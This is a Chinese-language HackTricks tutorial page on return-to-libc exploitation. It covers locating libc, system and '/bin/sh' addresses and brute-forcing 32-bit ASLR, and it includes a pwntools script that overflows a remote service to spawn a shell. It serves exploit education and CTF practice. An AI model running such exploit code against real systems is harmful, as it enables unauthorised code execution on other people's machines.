# Ret2lib

{% hint style="success" %}
学习与实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
学习与实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>支持 HackTricks</summary>

* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass) 或 **关注** 我们的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub 仓库提交 PR 分享黑客技巧。

</details>
{% endhint %}

## **基本信息**

**Ret2Libc** 的本质是将易受攻击程序的执行流重定向到共享库中的一个函数（例如，**system**、**execve**、**strcpy**），而不是在栈上执行攻击者提供的 shellcode。攻击者构造一个有效载荷，修改栈上的返回地址以指向所需的库函数，同时确保根据调用约定正确设置任何必要的参数。

### **示例步骤（简化）**

* 获取要调用的函数的地址（例如 system）和要调用的命令（例如 /bin/sh）
* 生成一个 ROP 链以传递指向命令字符串的第一个参数，并将执行流传递给该函数

## 查找地址

* 假设使用的 `libc` 是当前机器上的，可以通过以下方式找到它在内存中加载的位置：

{% code overflow="wrap" %}
```bash
ldd /path/to/executable | grep libc.so.6 #Address (if ASLR, then this change every time)
```
{% endcode %}

如果你想检查 ASLR 是否在改变 libc 的地址，你可以这样做：
```bash
for i in `seq 0 20`; do ldd ./<bin> | grep libc; done
```
* 知道使用的libc后，也可以通过以下方式找到`system`函数的偏移：
```bash
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
```
* 知道使用的libc后，也可以通过以下方式找到字符串`/bin/sh`函数的偏移：
```bash
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
```
### 使用 gdb-peda / GEF

知道使用的 libc 后，也可以使用 Peda 或 GEF 获取 **system** 函数、**exit** 函数和字符串 **`/bin/sh`** 的地址：
```bash
p system
p exit
find "/bin/sh"
```
### 使用 /proc/\<PID>/maps

如果进程在每次与其交互时都在创建**子进程**（网络服务器），请尝试**读取**该文件（可能需要以root身份运行）。

在这里你可以找到**libc在进程中加载的确切位置**以及**每个子进程将要加载的位置**。

![](<../../../.gitbook/assets/image (853).png>)

在这种情况下，它加载在**0xb75dc000**（这将是libc的基地址）

## 未知的libc

可能你**不知道二进制文件加载的libc**（因为它可能位于你没有访问权限的服务器上）。在这种情况下，你可以利用漏洞**泄露一些地址并找出使用的libc**库：

{% content-ref url="rop-leaking-libc-address/" %}
[rop-leaking-libc-address](rop-leaking-libc-address/)
{% endcontent-ref %}

你可以在这里找到一个pwntools模板：

{% content-ref url="rop-leaking-libc-address/rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-address/rop-leaking-libc-template.md)
{% endcontent-ref %}

### 通过2个偏移量识别libc

查看页面 [https://libc.blukat.me/](https://libc.blukat.me/) 并使用**几个地址**的函数来找出**使用的版本**。

## 绕过32位的ASLR

这些暴力破解攻击**仅对32位系统有用**。

* 如果利用是本地的，你可以尝试暴力破解libc的基地址（对32位系统有用）：
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
* 如果攻击远程服务器，您可以尝试 **暴力破解 `libc` 函数 `usleep` 的地址**，传递参数 10（例如）。如果在某个时刻 **服务器响应多了 10 秒**，您就找到了这个函数的地址。

## One Gadget

执行一个 shell，只需跳转到 **一个** 特定的 **地址** 在 libc 中：

{% content-ref url="one-gadget.md" %}
[one-gadget.md](one-gadget.md)
{% endcontent-ref %}

## x86 Ret2lib 代码示例

在这个示例中，ASLR 暴力破解集成在代码中，易受攻击的二进制文件位于远程服务器上：
```python
from pwn import *

c = remote('192.168.85.181',20002)
c.recvline()

for off in range(0xb7000000, 0xb8000000, 0x1000):
p = ""
p += p32(off + 0x0003cb20) #system
p += "CCCC" #GARBAGE, could be address of exit()
p += p32(off + 0x001388da) #/bin/sh
payload = 'A'*0x20010 + p
c.send(payload)
c.interactive()
```
## x64 Ret2lib 代码示例

查看示例来自：

{% content-ref url="../" %}
[..](../)
{% endcontent-ref %}

## ARM64 Ret2lib 示例

在 ARM64 的情况下，ret 指令跳转到 x30 寄存器指向的位置，而不是栈寄存器指向的位置。因此，这要复杂一些。

此外，在 ARM64 中，一条指令执行其本身的操作（不可能在指令中间跳转并将其转换为新的指令）。

查看示例来自：

{% content-ref url="ret2lib-+-printf-leak-arm64.md" %}
[ret2lib-+-printf-leak-arm64.md](ret2lib-+-printf-leak-arm64.md)
{% endcontent-ref %}

## Ret-into-printf（或 puts）

这允许通过调用 `printf`/`puts` 并将一些特定数据作为参数传递来**泄露进程中的信息**。例如，将 `puts` 在 GOT 中的地址放入 `puts` 的执行中将**泄露 `puts` 在内存中的地址**。

## Ret2printf

这基本上意味着滥用 **Ret2lib 将其转变为 `printf` 格式字符串漏洞**，通过使用 `ret2lib` 调用 printf 并利用其值（听起来没用但可能）：

{% content-ref url="../../format-strings/" %}
[format-strings](../../format-strings/)
{% endcontent-ref %}

## 其他示例与参考

* [https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html)
* Ret2lib，给定 libc 中一个函数的地址泄露，使用一个 gadget
* [https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html)
* 64 位，启用 ASLR 但没有 PIE，第一步是填充溢出直到 canary 的字节 0x00，然后调用 puts 并泄露它。使用 canary 创建一个 ROP gadget 调用 puts 来泄露 GOT 中 puts 的地址，然后调用 `system('/bin/sh')` 的 ROP gadget
* [https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html)
* 64 位，启用 ASLR，没有 canary，主函数中的栈溢出。ROP gadget 调用 puts 来泄露 GOT 中 puts 的地址，然后调用一个 gadget。
* [https://guyinatuxedo.github.io/08-bof\_dynamic/hs19\_storytime/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/hs19\_storytime/index.html)
* 64 位，没有 pie，没有 canary，没有 relro，nx。使用 write 函数泄露 write（libc）的地址并调用一个 gadget。
* [https://guyinatuxedo.github.io/14-ret\_2\_system/asis17\_marymorton/index.html](https://guyinatuxedo.github.io/14-ret\_2\_system/asis17\_marymorton/index.html)
* 使用格式字符串从栈中泄露 canary，并通过缓冲区溢出调用 system（它在 GOT 中）并传递 `/bin/sh` 的地址。
* [https://guyinatuxedo.github.io/14-ret\_2\_system/tu\_guestbook/index.html](https://guyinatuxedo.github.io/14-ret\_2\_system/tu\_guestbook/index.html)
* 32 位，没有 relro，没有 canary，nx，pie。滥用错误索引从栈中泄露 libc 和堆的地址。滥用缓冲区溢出进行 ret2lib 调用 `system('/bin/sh')`（需要堆地址以绕过检查）。

{% hint style="success" %}
学习与实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
学习与实践 GCP 黑客技术： <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>支持 HackTricks</summary>

* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **在 Twitter 上关注** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享黑客技巧。

</details>
{% endhint %}
